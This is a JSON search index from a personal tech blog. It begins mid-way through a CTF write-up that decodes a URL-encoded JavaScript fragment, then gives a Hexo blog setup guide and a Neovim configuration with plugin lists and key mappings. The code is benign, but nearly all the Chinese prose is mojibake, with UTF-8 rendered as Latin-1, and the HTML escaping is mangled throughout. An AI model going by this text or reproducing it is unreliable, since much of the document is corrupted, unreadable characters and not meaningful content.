style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e74\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e42\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e79\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e49\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e64\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e28\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e22\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e6\u003c/span\u003ec\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e65\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e76\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e65\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e6\u003c/span\u003ec\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e51\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e75\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e65\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e73\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e74\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e22\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e29\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e2\u003c/span\u003ee\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e6\u003c/span\u003ef\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e6\u003c/span\u003ee\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e73\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e75\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e62\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e6\u003c/span\u003ed\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e69\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e74\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e3\u003c/span\u003ed\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e63\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e68\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e65\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e63\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e6\u003c/span\u003eb\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e53\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e75\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e62\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e6\u003c/span\u003ed\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e69\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e74\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e3\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003eb\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eprint urllib\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eunquote(a\u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003eb)\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eå¾—åˆ°ä»£ç å¦‚ä¸‹ï¼š\u003c/p\u003e","title":"bugku writeup"},{"content":"åŸºç¡€ä¿®æ”¹ ä¿®æ”¹ _config.ymlï¼Œå†™ä¸Šç½‘ç«™çš„æ ‡é¢˜\ntitle: subtitle: description: é€‰æ‹©ä¸»é¢˜\ntheme: next hexo æ’ä»¶ å­—æ•°ç»Ÿè®¡å’Œé˜…è¯»æ—¶é•¿ç»Ÿè®¡ https://github.com/theme-next/hexo-symbols-count-time\nåœ¨ _config.yml ä¸­æ·»åŠ \nsymbols_count_time: symbols: true time: true total_symbols: true total_time: true exclude_codeblock: false awl: 4 wpm: 275 suffix: \u0026#34;mins.\u0026#34; åœ¨Nextä¸»é¢˜ä¸­çš„ _config.ymlä¸­æ·»åŠ \nsymbols_count_time: separated_meta: true item_text_post: true item_text_total: true git éƒ¨ç½² åœ¨ä½ çš„githubè´¦æˆ·ä¸Šåˆ›å»ºä»“åº“yourusername.github.ioï¼Œå¿…é¡»æ˜¯ç”¨æˆ·åå¼€å¤´å‘½åï¼Œå¦åˆ™github pageä¸ä¼šç”Ÿæ•ˆã€‚\né¦–å…ˆç”Ÿæˆä¸ªäººå…¬ç§é’¥\ncd ssh-keygen -t rsa -C \u0026#34;your_email@example.com\u0026#34; ç„¶åå°†å…¬é’¥ç²˜è´´è¿›githubè´¦æˆ·çš„ä¸ªäººè®¾ç½®é‡Œé¢ ssh -T git@github.com git config --global user.name \u0026#34;username\u0026#34; git config --global user.email \u0026#34;email\u0026#34; åœ¨åšå®¢ç›®å½•ä¸‹ä¸‹è½½ï¼š\nnpm install hexo-deployer-git --save ä¿®æ”¹ç½‘ç«™æ ¹ç›®å½•ä¸‹çš„_config.ymlæ–‡ä»¶\ndeploy: - type: git#æ³¨æ„gitçš„å‰é¢è¦åŠ ç©ºæ ¼å¦åˆ™ä¸ç”Ÿæ•ˆ repo: https://github.com/example/example.github.io.git branch: master ä¿å­˜é€€å‡ºåæ‰§è¡Œå‘½ä»¤ï¼š\ngit config --global user.email \u0026#34;you@example.com\u0026#34; git config --global user.name \u0026#34;Your Name\u0026#34; hexo d #éƒ¨ç½² ä¹Ÿå¯ä»¥éƒ¨ç½²åˆ°ä¸ªäººç½‘ç«™ä¸Šé¢ï¼Œéœ€è¦ç”¨åˆ°git hookï¼Œå¯ä»¥å»å‚è€ƒåˆ«çš„åšå®¢\ndeploy: - type: git repo: root@xxx.xxx.xxx.xxx:blog.git branch: master - type: git repo: git@github.com:xxx/xxx.github.io.git branch: master Next ä¸»é¢˜å®šåˆ¶ ä¸»é¡µï¼šhttps://github.com/theme-next/hexo-theme-next\nä¸»é¢˜é€‰æ‹© è¿›å…¥hexo-theme-nextç›®å½•ä¸‹çš„_config.ymlæ–‡ä»¶ï¼Œä¾æ®ä¸ªäººåå¥½ä¿®æ”¹é£æ ¼ï¼š\n# Schemes # scheme: Muse # scheme: Mist # scheme: Pisces # scheme: Gemini # é€‰æ‹©ä¸€ä¸ªå–œæ¬¢çš„ï¼Œå»æ‰#å³å¯ å¯åŠ¨ä¸‹é¢çš„darkmodeï¼Œè¿™æ ·ç½‘é¡µä¼šéšç€æµè§ˆå™¨\nå‹é“¾ åœ¨ä¸»é¢˜çš„_config.ymlæ–‡ä»¶é‡Œé¢çš„linké¡¹ç›®é‡Œé¢è®¾ç½®å³å¯ã€‚\né¡¶éƒ¨åŠ è½½æ¡ ä¸»é¡µ https://github.com/theme-next/theme-next-pace\ngit clone https://github.com/theme-next/theme-next-pace source/lib/pace ç„¶å_config.ymlä¸­é€‰æ‹©\n# Progress bar in the top during page loading. # Dependencies: https://github.com/theme-next/theme-next-pace # For more information: https://github.com/HubSpot/pace pace: enable: true # Themes list: # big-counter | bounce | barber-shop | center-atom | center-circle | center-radar | center-simple # corner-indicator | fill-left | flat-top | flash | loading-bar | mac-osx | material | minimal theme: corner-indicator è‡ªå®šä¹‰å›¾æ ‡ https://www.easyicon.net/language.en/iconsearch\nä¸‹è½½32çš„,ç„¶åæ”¾åœ¨ä¸»é¢˜æ–‡ä»¶ä¸­çš„imagesæ–‡ä»¶ä¸­,åœ¨é…ç½®ä¸­æœç´¢faviconå¹¶ä¿®æ”¹\nå¤´åƒ å°†å–œæ¬¢çš„å¤´åƒæ”¾åœ¨imagesé‡Œé¢ç„¶ååœ¨é…ç½®ä¸­æœç´¢avatarå¹¶ä¿®æ”¹\nç¤¾äº¤é“¾æ¥ social: GitHub: https://github.com/ch4ser-go || fab fa-github E-Mail: mailto:ch4ser.go@gmail.com || fa fa-envelope Telegram: https://t.me/darkch4ser || fab fa-telegram RSS: /atom.xml || fa fa-rss æš—é»‘æ¨¡å¼æŒä¹…åŒ– ä¿®æ”¹ themes/next/source/css/_colors.styl\nif (hexo-config(\u0026#39;darkmode\u0026#39;)) { :root { --body-bg-color: $body-bg-color-dark; --content-bg-color: $content-bg-color-dark; --card-bg-color: $card-bg-color-dark; --text-color: $text-color-dark; --blockquote-color: $blockquote-color-dark; --link-color: $link-color-dark; --link-hover-color: $link-hover-color-dark; --brand-color: $brand-color-dark; --brand-hover-color: $brand-hover-color-dark; --table-row-odd-bg-color: $table-row-odd-bg-color-dark; --table-row-hover-bg-color: $table-row-hover-bg-color-dark; --menu-item-bg-color: $menu-item-bg-color-dark; --btn-default-bg: $btn-default-bg-dark; --btn-default-color: $btn-default-color-dark; --btn-default-border-color: $btn-default-border-color-dark; --btn-default-hover-bg: $btn-default-hover-bg-dark; --btn-default-hover-color: $btn-default-hover-color-dark; --btn-default-hover-border-color: $btn-default-hover-border-color-dark; } img { opacity: .75; \u0026amp;:hover { opacity: .9; } } } ä¿®æ”¹ä¸»é¢˜é…ç½®æ–‡ä»¶ï¼Œä¿®æ”¹codeblock\ncodeblock: # Code Highlight theme # Available values: normal | night | night eighties | night blue | night bright | solarized | solarized dark | galactic # See: https://github.com/chriskempson/tomorrow-theme highlight_theme: night eighties # Add copy button on codeblock copy_button: enable: true # Show text copy result. show_result: true # Available values: default | flat | mac style: license æ·»åŠ  ä¿®æ”¹nextä¸»é¢˜é…ç½®æ–‡ä»¶\n# Creative Commons 4.0 International License. # See: https://creativecommons.org/share-your-work/licensing-types-examples # Available values of license: by | by-nc | by-nc-nd | by-nc-sa | by-nd | by-sa | zero # You can set a language value if you prefer a translated version of CC license, e.g. deed.zh # CC licenses are available in 39 languages, you can find the specific and correct abbreviation you need on https://creativecommons.org creative_commons: license: by-nc-sa sidebar: false post: true language: ç„¶åä¿®æ”¹åšå®¢ç›®å½•ä¸‹çš„_config.ymlï¼ŒåŠ ä¸Šè‡ªå·±çš„url\nurl: http://www.ch4ser.top å›¾åºŠé—®é¢˜ ä»¥å‰éƒ½æ˜¯ç”¨githubçš„å›¾åºŠ, ç°åœ¨ç›´æ¥æ”¾åœ¨æœ¬åœ°äº†\næˆ‘æ˜¯åœ¨sourceä¸‹é¢æ–°å»ºäº†ä¸€ä¸ªimagesæ–‡ä»¶å¤¹, ç„¶ååœ¨æ‰€æœ‰æ–‡ç« çš„å¼€å¤´éƒ½åŠ ä¸Štypora-root-url: ../, åŒæ—¶åœ¨åå¥½é‡Œé¢è®¾ç½®å›¾ç‰‡å­˜å‚¨ä½ç½®ä¸º../images/${filename} , è¿™æ ·å­typoraåœ¨æ’å…¥å›¾ç‰‡çš„æ—¶å€™å°±ä¼šæŠŠä»–æ”¾åœ¨/source/imagesä¸‹é¢çš„å¯¹åº”æ–‡ç« æ–‡ä»¶å¤¹ä¸‹é¢äº†, åŒæ—¶å‹¾é€‰ä½¿ç”¨ç›¸å¯¹è·¯å¾„ã€‚å†ä¹Ÿä¸ç”¨å›¾åºŠå•¦.\n","permalink":"https://dragonbox.top/posts/tech-hexo%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/","summary":"\u003ch2 id=\"åŸºç¡€ä¿®æ”¹\"\u003eåŸºç¡€ä¿®æ”¹\u003c/h2\u003e\n\u003cp\u003eä¿®æ”¹ _config.ymlï¼Œå†™ä¸Šç½‘ç«™çš„æ ‡é¢˜\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003etitle:\nsubtitle:\ndescription:\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eé€‰æ‹©ä¸»é¢˜\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003etheme: next\n\u003c/code\u003e\u003c/pre\u003e\u003ch2 id=\"hexo-æ’ä»¶\"\u003ehexo æ’ä»¶\u003c/h2\u003e\n\u003ch3 id=\"å­—æ•°ç»Ÿè®¡å’Œé˜…è¯»æ—¶é•¿ç»Ÿè®¡\"\u003eå­—æ•°ç»Ÿè®¡å’Œé˜…è¯»æ—¶é•¿ç»Ÿè®¡\u003c/h3\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/theme-next/hexo-symbols-count-time\"\u003ehttps://github.com/theme-next/hexo-symbols-count-time\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003eåœ¨ _config.yml ä¸­æ·»åŠ \u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003esymbols_count_time:\n  symbols: true\n  time: true\n  total_symbols: true\n  total_time: true\n  exclude_codeblock: false\n  awl: 4\n  wpm: 275\n  suffix: \u0026#34;mins.\u0026#34;\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eåœ¨Nextä¸»é¢˜ä¸­çš„ _config.ymlä¸­æ·»åŠ \u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003esymbols_count_time:\n  separated_meta: true\n  item_text_post: true\n  item_text_total: true\n\u003c/code\u003e\u003c/pre\u003e\u003ch3 id=\"git-éƒ¨ç½²\"\u003egit éƒ¨ç½²\u003c/h3\u003e\n\u003cp\u003eåœ¨ä½ çš„githubè´¦æˆ·ä¸Šåˆ›å»ºä»“åº“\u003ccode\u003eyourusername.github.io\u003c/code\u003eï¼Œå¿…é¡»æ˜¯ç”¨æˆ·åå¼€å¤´å‘½åï¼Œå¦åˆ™\u003ccode\u003egithub page\u003c/code\u003eä¸ä¼šç”Ÿæ•ˆã€‚\u003c/p\u003e\n\u003cp\u003eé¦–å…ˆç”Ÿæˆä¸ªäººå…¬ç§é’¥\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003ecd\nssh-keygen -t rsa -C \u0026#34;your_email@example.com\u0026#34;\nç„¶åå°†å…¬é’¥ç²˜è´´è¿›githubè´¦æˆ·çš„ä¸ªäººè®¾ç½®é‡Œé¢\nssh -T git@github.com\ngit config --global user.name \u0026#34;username\u0026#34;\ngit config --global user.email \u0026#34;email\u0026#34;\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eåœ¨åšå®¢ç›®å½•ä¸‹ä¸‹è½½ï¼š\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003enpm install hexo-deployer-git --save\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eä¿®æ”¹ç½‘ç«™æ ¹ç›®å½•ä¸‹çš„_config.ymlæ–‡ä»¶\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003edeploy:\n  - type: git#æ³¨æ„gitçš„å‰é¢è¦åŠ ç©ºæ ¼å¦åˆ™ä¸ç”Ÿæ•ˆ\n  \trepo: https://github.com/example/example.github.io.git\n  \tbranch: master\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eä¿å­˜é€€å‡ºåæ‰§è¡Œå‘½ä»¤ï¼š\u003c/p\u003e","title":"ä½¿ç”¨hexoå’Œgithubæ­å»ºç½‘ç«™"},{"content":"ch3n9w çš„ vim æœ¬ç¯‡æ–‡ç« ä¸­çš„æ’ä»¶å‡å·²è¿‡æ—¶, ä¸æ¨èä½¿ç”¨\nã€Šç¨‹åºå‘˜ä¿®ç‚¼ä¹‹é“ã€‹ä¸­æœ‰ä¸€å¥è¯:æœ€å¥½æ˜¯ç²¾é€šä¸€ç§ç¼–è¾‘å™¨ï¼Œå¹¶å°†å…¶ç”¨äºæ‰€æœ‰ç¼–è¾‘ä»»åŠ¡ã€‚å¦‚æœä¸åšæŒä½¿ç”¨ä¸€ç§ç¼–è¾‘å™¨ï¼Œå¯èƒ½ä¼šé¢ä¸´ç°ä»£çš„å·´åˆ«ç‰¹å¤§æ··ä¹±ã€‚ ï¼Œå®è´¨ä»Šæ—¥ï¼Œæ·±ä»¥ä¸ºç„¶ã€‚è€Œè‡ªä»æ¥è§¦vimä¹‹åæˆ‘ä¸€ç›´éƒ½ä¿æŒç€æœ‰ç©ºæŠ˜è…¾æŠ˜è…¾çš„å¥½ä¹ æƒ¯ï¼Œå®ƒçš„ç®€æ´å’Œé«˜åº¦è‡ªç”±è®©äººç€è¿·ï¼Œå›´ç»•ç€vimè¡ç”Ÿå‡ºçš„æ’ä»¶æ•°ä¸èƒœæ•°ã€‚å¥ˆä½•æ’ä»¶ç¹å¤šçš„åŒæ—¶ä¹Ÿæ„å‘³ç€é€‰æ‹©çš„å›°éš¾å’Œé…ç½®çš„ç¹çã€‚ä¸ºäº†å‡†å¤‡ä»¥åå¯èƒ½å‡ºç°çš„çªå‘æƒ…å†µæ¯”å¦‚é…ç½®ä¸¢å¤±æˆ–è€…é‡æ–°å®‰è£…ï¼Œç‰¹åœ¨æ­¤ä»¥å®ç°ç‰¹å®šåŠŸèƒ½ä¸ºä¸»é¢˜ï¼Œè®°å½•è‡ªå·±é…ç½®vimçš„è¿‡ç¨‹ã€‚\nç›¸æ¯”è¾ƒvim, neovimçš„é€Ÿåº¦æ›´å¿«.\nä¸ºäº†è°ƒåŠ¨é£Ÿæ¬²,å…ˆä¸Šæ•ˆæœå›¾:\nvimä¸‹æ‰“å¼€ç»ˆç«¯\nä»¥ä¸‹å†…å®¹æ˜¯é…ç½® å®‰è£…ï¼ˆvim-plugï¼‰ curl -fLo ~/.local/share/nvim/site/autoload/plug.vim --create-dirs \\ https://raw.githubusercontent.com/junegunn/vim-plug/master/plug.vim ~/.config/nvim/init.vim \u0026#34; c to caplock , add XKBOPTIONS=\u0026#34;caps:escape\u0026#34; in /etc/default/keyboard \u0026#34; è®©è¿›å…¥vimçš„æ—¶å€™æ˜¾ç¤ºç»å¯¹è¡Œå·,å½“è¿›å…¥ç¼–è¾‘æ¨¡å¼çš„æ—¶å€™ä¹Ÿæ˜¾ç¤ºç»å¯¹è¡Œå·,ä½†æ˜¯ä»ç¼–è¾‘æ¨¡å¼å›åˆ°æ™®é€šæ¨¡å¼çš„æ—¶å€™åˆ‡æ¢åˆ°ç›¸å¯¹è¡Œå· set number augroup relative_numbser autocmd! autocmd InsertEnter * :set norelativenumber autocmd InsertLeave * :set relativenumber augroup END set wildmenu \u0026#34; å¿½ç•¥å¤§å°å†™ set ignorecase set shell=/bin/zsh \u0026#34; font and icons for vim set encoding=utf8 \u0026#34; set guifont=DroidSansMono\\ Nerd\\ Font\\ 11 autocmd User Startified setlocal buflisted \u0026#34; leaderé”®æ˜ å°„ let mapleader=\u0026#34;\\\u0026lt;Space\u0026gt;\u0026#34; map \u0026lt;leader\u0026gt;w :w\u0026lt;CR\u0026gt; map \u0026lt;leader\u0026gt;q :q!\u0026lt;CR\u0026gt; map \u0026lt;leader\u0026gt;r :call Runit()\u0026lt;CR\u0026gt; \u0026#34; è®¾å®šå‡½æ•°,è‡ªåŠ¨æ ¹æ®æ–‡ä»¶ç±»å‹æ¥è°ƒç”¨ç›¸åº”çš„è§£é‡Šå™¨æ¥æ‰§è¡Œä»£ç  func Runit() if \u0026amp;filetype == \u0026#39;php\u0026#39; exec \u0026#34;!time php %\u0026#34; elseif \u0026amp;filetype == \u0026#39;python\u0026#39; exec \u0026#34;!time python %\u0026#34; elseif \u0026amp;filetype == \u0026#39;c\u0026#39; exec \u0026#34;!gcc % -o %\u0026lt;\u0026#34; exec \u0026#34;!time sudo ./%\u0026lt;\u0026#34; elseif \u0026amp;filetype == \u0026#39;cpp\u0026#39; exec \u0026#34;!g++ % -o %\u0026lt;\u0026#34; exec \u0026#34;!time ./%\u0026lt;\u0026#34; endif endfunc \u0026#34; \u0026#34; set shift width set shiftwidth=4 set scrolloff=6 \u0026#34; å¯åŠ¨é¼ æ ‡ set mouse=n map \u0026lt;ScrollWheelUp\u0026gt; \u0026lt;C-Y\u0026gt; map \u0026lt;ScrollWheelDown\u0026gt; \u0026lt;C-E\u0026gt; \u0026#34; å…³äºå¤šçª—å£çš„é”®ä½æ˜ å°„ map vs :vs map sp :sp map \u0026lt;leader\u0026gt;l \u0026lt;C-w\u0026gt;l map \u0026lt;leader\u0026gt;h \u0026lt;C-w\u0026gt;h map \u0026lt;leader\u0026gt;j \u0026lt;C-w\u0026gt;j map \u0026lt;leader\u0026gt;k \u0026lt;C-w\u0026gt;k map \u0026lt;leader\u0026gt;L \u0026lt;C-w\u0026gt;L map \u0026lt;leader\u0026gt;H \u0026lt;C-w\u0026gt;H map \u0026lt;leader\u0026gt;J \u0026lt;C-w\u0026gt;J map \u0026lt;leader\u0026gt;K \u0026lt;C-w\u0026gt;K \u0026#34; ç»ˆç«¯æ¨¡å¼ map te :vs\u0026lt;CR\u0026gt;\u0026lt;C-w\u0026gt;L:te\u0026lt;CR\u0026gt;A tnoremap \u0026lt;esc\u0026gt; \u0026lt;C-\\\u0026gt;\u0026lt;C-n\u0026gt; \u0026#34; å…³äºå¤šæ ‡ç­¾æ¨¡å¼çš„è®¾å®š map tn :tabnew map L :tabnext\u0026lt;CR\u0026gt; map H :tabprev\u0026lt;CR\u0026gt; \u0026#34; ä»£ç æŠ˜å  set foldmethod=indent set foldlevel=99 \u0026#34; \u0026#34; é«˜äº®å½“å‰çš„è¡Œå’Œåˆ— set cursorcolumn set cursorline highlight CursorLine cterm=NONE ctermbg=black ctermfg=green highlight CursorColumn cterm=NONE ctermbg=black ctermfg=green \u0026#34; è¿™æ®µä»£ç å¯ä»¥è®©æ¯æ¬¡æ‰“å¼€æ–‡ä»¶çš„æ—¶å€™å°†å…‰æ ‡å®šä½åˆ°ä¸Šä¸€æ¬¡æ‰€åœ¨çš„ä½ç½® au BufReadPost * if line(\u0026#34;\u0026#39;\\\u0026#34;\u0026#34;) \u0026gt; 1 \u0026amp;\u0026amp; line(\u0026#34;\u0026#39;\\\u0026#34;\u0026#34;) \u0026lt;= line(\u0026#34;$\u0026#34;) | exe \u0026#34;normal! g\u0026#39;\\\u0026#34;\u0026#34; | endif \u0026#34; å¼•å…¥æ’ä»¶ source ~/.vim/plugins.vim \u0026#34; è¿™ä¸ªæ˜¯ä¸ºäº†åœ¨ç¼–å†™pythonçš„æ—¶å€™æ–¹ä¾¿åœ¨vimå†…éƒ¨æµè§ˆpythonæ–‡æ¡£è€Œæ·»åŠ çš„ï¼Œåœ¨githubä¸Šæœ‰ \u0026#34; source ~/.vim/pydoc.vim/ftplugin/python_pydoc.vim ~/.vim/plugins.vim call plug#begin(\u0026#39;~/.vim/plugged\u0026#39;) \u0026#34; ä»£ç è¡¥å…¨æ’ä»¶ \u0026#34; Plug \u0026#39;neoclide/coc.nvim\u0026#39;, {\u0026#39;branch\u0026#39;: \u0026#39;release\u0026#39;} Plug \u0026#39;ncm2/ncm2\u0026#39; Plug \u0026#39;ncm2/ncm2-jedi\u0026#39; Plug \u0026#39;ncm2/ncm2-bufword\u0026#39; Plug \u0026#39;ncm2/ncm2-path\u0026#39; Plug \u0026#39;roxma/nvim-yarp\u0026#39; Plug \u0026#39;phpactor/phpactor\u0026#39; , {\u0026#39;do\u0026#39;: \u0026#39;composer install\u0026#39;, \u0026#39;for\u0026#39;: \u0026#39;php\u0026#39;} Plug \u0026#39;phpactor/ncm2-phpactor\u0026#39; \u0026#34; å¤–è§‚æ’ä»¶ Plug \u0026#39;KeitaNakamura/neodark.vim\u0026#39; Plug \u0026#39;cocopon/iceberg.vim\u0026#39; Plug \u0026#39;vim-airline/vim-airline\u0026#39; Plug \u0026#39;ryanoasis/vim-devicons\u0026#39; \u0026#34; ä»£ç ç»“æ„æ˜¾ç¤º Plug \u0026#39;vim-scripts/taglist.vim\u0026#39; \u0026#34; ä»£ç æ ‡è®°,å¹¶ä¸”å¯ä»¥åœ¨æ ‡è®°ä¹‹é—´è·³è½¬ Plug \u0026#39;MattesGroeger/vim-bookmarks\u0026#39; \u0026#34; ç›®å½•æ ‘ Plug \u0026#39;scrooloose/nerdtree\u0026#39; \u0026#34; æ‹¬å·è‡ªåŠ¨è¡¥å…¨ Plug \u0026#39;jiangmiao/auto-pairs\u0026#39; \u0026#34; å¿«é€Ÿæ³¨é‡Š Plug \u0026#39;scrooloose/nerdcommenter\u0026#39; \u0026#34; èŠ±é‡Œèƒ¡å“¨çš„å°æ’ä»¶ï¼Œå¯ä»¥è®©æ‰“å­—å‘å‡ºéŸ³ä¹ \u0026#34; Plug \u0026#39;skywind3000/vim-keysound\u0026#39; call plug#end() \u0026#34; Plugin setting \u0026#34; source /home/ch3n9w/.vim/plugset/nerdtree.vim source /home/ch3n9w/.vim/plugset/ncm2.vim source /home/ch3n9w/.vim/plugset/bookmark.vim source /home/ch3n9w/.vim/plugset/airline.vim source /home/ch3n9w/.vim/plugset/taglists.vim source /home/ch3n9w/.vim/plugset/autopair.vim source /home/ch3n9w/.vim/plugset/nerdcomment.vim \u0026#34; source ~/.vim/plugset/keysound.vim ~/.vim/plugset/ncm2.vim inoremap \u0026lt;expr\u0026gt; \u0026lt;Tab\u0026gt; pumvisible() ? \u0026#34;\\\u0026lt;C-n\u0026gt;\u0026#34; : \u0026#34;\\\u0026lt;Tab\u0026gt;\u0026#34; inoremap \u0026lt;expr\u0026gt; \u0026lt;S-Tab\u0026gt; pumvisible() ? \u0026#34;\\\u0026lt;C-p\u0026gt;\u0026#34; : \u0026#34;\\\u0026lt;S-Tab\u0026gt;\u0026#34; inoremap \u0026lt;expr\u0026gt; \u0026lt;CR\u0026gt; (pumvisible() ? \u0026#34;\\\u0026lt;c-y\u0026gt;\\\u0026lt;cr\u0026gt;\u0026#34;: \u0026#34;\\\u0026lt;CR\u0026gt;\u0026#34;) autocmd BufEnter * call ncm2#enable_for_buffer() set completeopt=noinsert,menuone,noselect let ncm2#popup_delay = 5 let g:ncm2#matcher = \u0026#34;substrfuzzy\u0026#34; let g:ncm2_jedi#python_version = 3 let g:ncm2#match_highlight = \u0026#39;sans-serif\u0026#39; ~/.vim/plugset/airline.vim \u0026#34;if you want to enable solarized theme ,quote the snipeet \u0026#34; è¿™æ®µä»£ç è®©vimæ”¯æŒæ’ä»¶æ‰€éœ€çš„è‰²å½© if (empty($TMUX)) if (has(\u0026#34;nvim\u0026#34;)) \u0026#34;For Neovim 0.1.3 and 0.1.4 \u0026lt; https://github.com/neovim/neovim/pull/2198 \u0026gt; let $NVIM_TUI_ENABLE_TRUE_COLOR=1 endif \u0026#34;For Neovim \u0026gt; 0.1.5 and Vim \u0026gt; patch 7.4.1799 \u0026lt; https://github.com/vim/vim/commit/61be73bb0f965a895bfb064ea3e55476ac175162 \u0026gt; \u0026#34;Based on Vim patch 7.4.1770 (`guicolors` option) \u0026lt; https://github.com/vim/vim/commit/8a633e3427b47286869aa4b96f2bfc1fe65b25cd \u0026gt; \u0026#34; \u0026lt; https://github.com/neovim/neovim/wiki/Following-HEAD#20160511 \u0026gt; if (has(\u0026#34;termguicolors\u0026#34;)) set termguicolors endif endif \u0026#34;airline setting let g:airline_symbols = {} let g:airline_left_sep = 